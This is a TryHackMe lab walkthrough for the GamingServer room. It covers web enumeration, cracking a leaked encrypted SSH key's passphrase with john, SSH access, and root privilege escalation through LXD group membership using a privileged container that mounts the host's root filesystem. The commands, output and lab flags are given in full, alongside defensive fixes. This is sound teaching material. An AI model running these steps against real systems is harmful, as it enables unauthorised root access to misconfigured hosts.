#  GamingServer — TryHackMe Walkthrough

**By Sharat S Unnithan**

> **Difficulty:** Easy  
> **OS:** Linux (Ubuntu 18.04)  
> **Category:** Boot2Root  
> **Target IP (dynamic):** `<TARGET_IP>`  
> **Attack Platform:** Kali Linux (AttackBox or VPN)

---

## 📌 Room Overview

GamingServer is an easy Boot2Root box built by amateurs with no web development experience. The room description hints that we need to:

> *"Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system."*

The path involves web enumeration, credential harvesting, SSH key cracking, and **LXD container privilege escalation**.

---

## 🗺️ Attack Path Summary

```
┌─────────────────────────────────────────────────────────────┐
│  1. Reconnaissance    → nmap (22, 80)                       │
│  2. Web Enumeration   → username leak (john), hidden dirs   │
│  3. File Discovery    → /secret/secretKey, /uploads/dict.lst│
│  4. Key Cracking      → ssh2john + john → "letmein"         │
│  5. SSH Access        → user.txt flag                       │
│  6. Privesc (LXD)     → privileged container → root.txt     │
└─────────────────────────────────────────────────────────────┘
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `gobuster` | Directory brute-forcing |
| `curl` | Web page inspection and file download |
| `ssh2john` | Convert SSH private key to crackable hash |
| `john` | Crack the SSH key passphrase |
| `ssh` | Remote access |
| `lxd-alpine-builder` | Build a minimal Alpine image for LXD exploit |
| `lxc` | LXD container management (on target) |

---

## Phase 1: Reconnaissance

### 1.1 Check VPN Connectivity

```bash
ip a | grep tun
```

You should see a `tun0` interface with a `10.x.x.x` address. If not, reconnect the TryHackMe VPN or use the AttackBox.

### 1.2 Initial Nmap Scan

```bash
nmap -Pn -sC -sV -oN nmap_initial.txt <TARGET_IP>
```

**Why `-Pn`?** TryHackMe boxes often block ICMP. `-Pn` tells nmap to scan anyway.

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

**Key findings:**
- SSH on port 22 — likely our initial access vector
- HTTP on port 80 — likely contains credentials or hints
- Host is Ubuntu Linux

### 1.3 Full Port Scan (Optional)

For thoroughness, scan all ports:

```bash
nmap -Pn -p- --min-rate=1000 -oN nmap_allports.txt <TARGET_IP>
```

---

## Phase 2: Web Enumeration

### 2.1 Inspect the Homepage

```bash
curl -s http://<TARGET_IP> | tee homepage.html
```

**Key finding — an HTML comment leaking a username:**

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

**Analysis:** This is a classic developer oversight. We now have a candidate username: **`john`**.

### 2.2 Directory Brute-Force

```bash
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt \
  -o gobuster.txt
```

**Discovered directories:**

```
/secret/    (Status: 200)
/uploads/   (Status: 200)
```

**Manual verification:**

```bash
curl -s -o /dev/null -w "%{http_code} /secret/\n"  http://<TARGET_IP>/secret/
curl -s -o /dev/null -w "%{http_code} /uploads/\n" http://<TARGET_IP>/uploads/
```

Both return `200`.

### 2.3 Enumerate Hidden Directories

```bash
curl -s http://<TARGET_IP>/secret/
curl -s http://<TARGET_IP>/uploads/
```

**Files discovered:**
- `/secret/secretKey` → an encrypted SSH private key
- `/uploads/dict.lst` → a small custom wordlist

---

## Phase 3: Credential Harvesting

### 3.1 Download the Files

```bash
cd ~/Downloads
curl -O http://<TARGET_IP>/secret/secretKey
curl -O http://<TARGET_IP>/uploads/dict.lst
ls -la secretKey dict.lst
```

**Inspect:**

```bash
head -5 secretKey
wc -l dict.lst
head dict.lst
```

**Observations:**

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
```

The key is **encrypted** — we need a passphrase to use it. The wordlist `dict.lst` (222 entries) contains seasonal passwords like `Spring2017`, `spring2016`, etc. — perfect for cracking.

### 3.2 Crack the SSH Key Passphrase

**Step 1 — Convert the key to a John-compatible hash:**

```bash
ssh2john secretKey > secretKey.hash
```

Or if `ssh2john` isn't in PATH:

```bash
python3 /usr/share/john/ssh2john.py secretKey > secretKey.hash
```

**Step 2 — Crack with John:**

```bash
john --wordlist=dict.lst secretKey.hash
```

**Output:**

```
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
letmein          (secretKey)
1g 0:00:00:00 DONE
```

✅ **Passphrase found: `letmein`**

**Step 3 — Display the result:**

```bash
john --show secretKey.hash
```

---

## Phase 4: Initial Access (SSH)

### 4.1 Fix Key Permissions

SSH refuses to use keys that are world-readable:

```bash
chmod 600 secretKey
```

### 4.2 SSH into the Target

```bash
ssh -i secretKey john@<TARGET_IP>
```

When prompted for the passphrase, enter: `letmein`

**Welcome banner:**

```
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
...
john@exploitable:~$
```

✅ **We're in as `john`.**

### 4.3 Grab the User Flag

```bash
cat ~/user.txt
```

**User Flag:** `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`

---

## Phase 5: Privilege Escalation (LXD)

### 5.1 Enumerate User Privileges

```bash
id
groups
```

**Output:**

```
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

**🚨 Critical finding:** `john` is a member of the **`lxd`** group.

### 5.2 Why LXD = Root

LXD is a container manager that runs as **root** and listens on a Unix socket. Members of the `lxd` group can send commands to this daemon, which executes them **as root**.

If we can create a **privileged** container and mount the host's filesystem into it, we gain full root access to the host.

Verify LXD is available:

```bash
which lxc lxd
lxc list
```

**Output:**

```
/usr/bin/lxc
/usr/bin/lxd
+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
```

LXD is running with no containers yet.

### 5.3 Build the Alpine Image (On Attacker Machine)

The target has no internet access, so we build the image on Kali:

```bash
cd ~/Downloads
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

**Output:**

```
Determining the latest release... v3.24
...
OK: 9947 KiB in 27 packages
```

This creates `alpine-v3.24-x86_64-<DATE>.tar.gz`.

### 5.4 Transfer the Image to Target

```bash
scp -i ~/Downloads/secretKey \
    ~/Downloads/lxd-alpine-builder/alpine-v3.24-x86_64-*.tar.gz \
    john@<TARGET_IP>:/tmp/
```

Enter the passphrase (`letmein`) when prompted.

### 5.5 Import the Image (On Target)

```bash
cd /tmp
lxc image import alpine-v3.24-x86_64-*.tar.gz --alias myimage
lxc image list
```

### 5.6 Create a Privileged Container

```bash
lxc init myimage ignite -c security.privileged=true
```

**Why `security.privileged=true`?** By default, LXD containers use **user namespaces** — root inside the container is mapped to an unprivileged host user. Setting `security.privileged=true` removes that mapping, making container root = **host root**.

### 5.7 Mount the Host's Root Filesystem

```bash
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

**What this does:**
- `source=/` → the host's root filesystem
- `path=/mnt/root` → where it appears inside the container
- `recursive=true` → mount all subdirectories

### 5.8 Start the Container and Get a Shell

```bash
lxc start ignite
lxc exec ignite /bin/sh
```

Inside the container:

```sh
id
# uid=0(root) gid=0(root)
```

### 5.9 Read the Root Flag

```sh
cd /mnt/root/root
ls -la
cat root.txt
```

**Root Flag:** `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

---

## 🏁 Flags Summary

| Flag | Value |
|------|-------|
| **User Flag** | `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e` |
| **Root Flag** | `2e337b8c9f3aff0c2b3e8d4e6a7c88fc` |

---

## 🧠 Key Concepts Explained

### LXD Privilege Escalation — Deep Dive

| Concept | Explanation |
|---------|-------------|
| **LXD** | A container manager (like Docker but for system containers) running as root |
| **`lxd` group** | Members can command the LXD daemon → effectively root-equivalent |
| **Unprivileged container** | Default: root inside ≠ root outside (user namespace mapping) |
| **Privileged container** | `security.privileged=true` → container root = host root |
| **Disk device** | Mounts host paths into the container (`source=/` → `path=/mnt/root`) |
| **Exploit combo** | Privileged container + host mount = full root access |

### Why This Isn't a "Bug"

This is **intended behavior** — the `lxd` group is documented as root-equivalent. The vulnerability is the **misconfiguration**: a regular user (`john`) was added to the `lxd` group.

---

## 🛡️ Defensive Recommendations

| Misconfiguration | Fix |
|------------------|-----|
| HTML comments leaking usernames | Strip comments before deployment |
| Publicly readable `/secret/` directory | Restrict access, never store keys on web server |
| Publicly readable `/uploads/` | Validate and restrict upload directories |
| Weak SSH key passphrase (`letmein`) | Enforce strong passphrases |
| User in `lxd` group | Remove regular users from `lxd`, `docker`, `disk` groups |
| Privileged containers allowed | Enforce unprivileged containers via LXD project restrictions |

---

## 📚 References

- [LXD Security Documentation](https://linuxcontainers.org/lxd/docs/latest/explanation/security/)
- [saghul/lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)
- [TryHackMe — GamingServer](https://tryhackme.com/room/gamingserver)

---

## 📝 Author

**Sharat S Unnithan**

- TryHackMe: [@sharat_s_unnithan](https://tryhackme.com/p/sharat_s_unnithan)
- GitHub: [github.com/sharat-s-unnithan](https://github.com/sharat-s-unnithan)

---

> ⚠️ **Disclaimer:** This walkthrough is for educational purposes only. All techniques demonstrated were performed in a controlled, legal lab environment (TryHackMe). Never use these techniques against systems you do not own or have explicit permission to test.

---

## 📄 License

MIT License — feel free to use this walkthrough for learning purposes.

---

**Happy Hacking! 🚀**
